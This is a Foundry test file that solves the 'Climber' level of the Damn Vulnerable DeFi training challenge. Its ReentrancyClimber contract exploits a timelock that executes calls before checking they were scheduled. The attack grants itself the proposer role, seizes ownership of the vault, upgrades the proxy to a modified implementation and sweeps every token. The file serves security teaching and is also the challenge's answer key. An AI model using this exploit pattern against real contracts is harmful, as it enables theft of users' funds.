// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
import {ClimberVaultModified} from "../../../src/Contracts/climber/ClimberVaultModified.sol";

contract Climber is Test {
    uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    ClimberTimelock internal climberTimelock;
    ClimberVault internal climberImplementation;
    ERC1967Proxy internal climberVaultProxy;
    address[] internal users;
    address payable internal deployer;
    address payable internal proposer;
    address payable internal sweeper;
    address payable internal attacker;

    // Variables needed for the attacker

    address[] targets;
    uint256[] values;
    bytes[] dataElements;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        utils = new Utilities();
        users = utils.createUsers(3);

        deployer = payable(users[0]);
        proposer = payable(users[1]);
        sweeper = payable(users[2]);

        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.1 ether);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        climberImplementation = new ClimberVault();
        vm.label(address(climberImplementation), "climber Implementation");

        bytes memory data = abi.encodeWithSignature("initialize(address,address,address)", deployer, proposer, sweeper);
        climberVaultProxy = new ERC1967Proxy(address(climberImplementation), data);

        assertEq(ClimberVault(address(climberVaultProxy)).getSweeper(), sweeper);

        assertGt(ClimberVault(address(climberVaultProxy)).getLastWithdrawalTimestamp(), 0);

        climberTimelock = ClimberTimelock(payable(ClimberVault(address(climberVaultProxy)).owner()));

        assertTrue(climberTimelock.hasRole(climberTimelock.PROPOSER_ROLE(), proposer));

        assertTrue(climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), deployer));

        // Deploy token and transfer initial token balance to the vault
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");
        dvt.transfer(address(climberVaultProxy), VAULT_TOKEN_BALANCE);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        ReentrancyClimber rc = new ReentrancyClimber(address(climberVaultProxy), address(climberTimelock));

        targets.push(address(rc));
        uint256 value = 0;
        values.push(value);
        bytes32 salt = 0;
        bytes memory dataElement = abi.encodeWithSignature("reentrance()");
        dataElements.push(dataElement);

        // Execute reentrancy with the contract
        ClimberTimelock(payable(ClimberVault(address(climberVaultProxy)).owner())).execute(
            targets, values, dataElements, salt
        );

        // Our contract has role proposer so we can change the ownership to the attacker address
        rc.changeOwnership(attacker);

        // Once the attacker is the owner we can update the implementation address
        ClimberVaultModified cvm = new ClimberVaultModified();
        vm.startPrank(attacker);
        (bool success,) =
            address(climberVaultProxy).call{value: 0}(abi.encodeWithSignature("upgradeTo(address)", address(cvm)));
        require(success);

        // Convert the attacker in the sweeper
        (success,) = address(climberVaultProxy).call{value: 0}(abi.encodeWithSignature("setSweeper(address)", attacker));
        require(success);

        // Sweep the funds
        (success,) = address(climberVaultProxy).call{value: 0}(abi.encodeWithSignature("sweepFunds(address)", dvt));
        require(success);

        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */
        assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(climberVaultProxy)), 0);
    }
}

contract ReentrancyClimber {
    address proxy;
    address climberTimeLock;
    bytes32 proposerRole;

    address[] targets = new address[](2);
    uint256[] values = new uint256[](2);
    bytes[] dataElements = new bytes[](2);
    bytes32 salt = 0;

    constructor(address _proxy, address _climberTimeLock) {
        proxy = _proxy;
        climberTimeLock = _climberTimeLock;
        proposerRole = ClimberTimelock(payable(climberTimeLock)).PROPOSER_ROLE();
    }

    function scheduleOperation() external {
        address[] memory _targets = new address[](1);
        uint256[] memory _values = new uint256[](1);
        bytes[] memory _dataElements = new bytes[](1);
        bytes32 _salt = 0;

        _targets[0] = address(this);
        _values[0] = 0;
        _dataElements[0] = abi.encodeWithSignature("reentrance()");

        ClimberTimelock(payable(ClimberVault(address(proxy)).owner())).schedule(_targets, _values, _dataElements, _salt);
        ClimberTimelock(payable(ClimberVault(address(proxy)).owner())).schedule(targets, values, dataElements, salt);
    }

    function reentrance() external {
        // This contract get role of proposer
        targets[0] = climberTimeLock;
        dataElements[0] = abi.encodeWithSignature("grantRole(bytes32,address)", proposerRole, address(this));
        values[0] = 0;
        // Schedule the proposal
        targets[1] = address(this);
        dataElements[1] = abi.encodeWithSignature("scheduleOperation()");
        values[1] = 0;
        ClimberTimelock(payable(ClimberVault(address(proxy)).owner())).execute(targets, values, dataElements, salt);
    }

    function changeOwnership(address newOwner) external {
        address[] memory _targets = new address[](1);
        uint256[] memory _values = new uint256[](1);
        bytes[] memory _dataElements = new bytes[](1);
        bytes32 _salt = 0;

        _targets[0] = address(proxy);
        _values[0] = 0;
        _dataElements[0] = abi.encodeWithSignature("transferOwnership(address)", newOwner);

        ClimberTimelock(payable(ClimberVault(address(proxy)).owner())).schedule(_targets, _values, _dataElements, _salt);
        ClimberTimelock(payable(ClimberVault(address(proxy)).owner())).execute(_targets, _values, _dataElements, _salt);
    }
}
